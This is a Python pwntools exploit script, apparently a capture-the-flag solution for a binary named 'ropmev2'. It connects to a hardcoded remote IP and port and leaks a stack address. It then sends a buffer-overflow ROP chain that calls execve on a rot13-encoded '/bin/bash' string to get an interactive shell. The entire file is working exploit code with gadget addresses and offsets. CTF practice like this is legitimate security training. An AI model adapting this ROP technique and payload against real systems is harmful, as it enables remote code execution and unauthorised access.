from pwn import *
import string

BINARY = './ropmev2'
host, port = '206.189.121.131' , '31805'

def load(mode):
	elf = context.binary = ELF(BINARY, checksec=False)
	# context.log_level = 'debug'
	if mode == 'gdb':
		return gdb.debug(BINARY, gdbscript=gdbscript)
	elif mode == 'remote':
		return remote(host, port)
	else:
		return process(BINARY)

def rot13(s):
	r13 = string.maketrans("ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz", "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
	return str.translate(s, r13)

gdbscript = '''
break *0x40116b
continue
'''

p = load('remote')

# First - leaking the stack address (and figuring out that the offset between 2 debugging is 224)
p.sendlineafter('Please dont hack me', 'DEBUG')
p.recvuntil('I dont know what this is ')
leaked_addr = int(p.recv(14), 16)
info("rsp_address: " + hex(leaked_addr))


# Calling execve with /bin/bash
pop_rdi = 0x40142b
pop_rax = 0x401162
pop_rsi_r15 = 0x401429
pop_rdx_r13 = 0x401164
syscall = 0x401168
bash = rot13("/bin/bash\x00")

payload  = bash										# "/bin/bash" will populate rdi
payload += "A" * (216 - len(bash)) 					# eip-offset is 216
payload += p64(pop_rdi) + p64(leaked_addr - 224) 	# figured out that the offset between 2 "debugging" is 224
payload += p64(pop_rax) + p64(59) 					# syscall 59 is "execve"
payload += p64(pop_rsi_r15) + p64(0x0) + p64(0x0) 	# clearing rsi
payload += p64(pop_rdx_r13) + p64(0x0) + p64(0x0) 	# 	   and rdx
payload += p64(syscall)								

p.sendlineafter('Please dont hack me', payload)

p.interactive() 	# getting a shell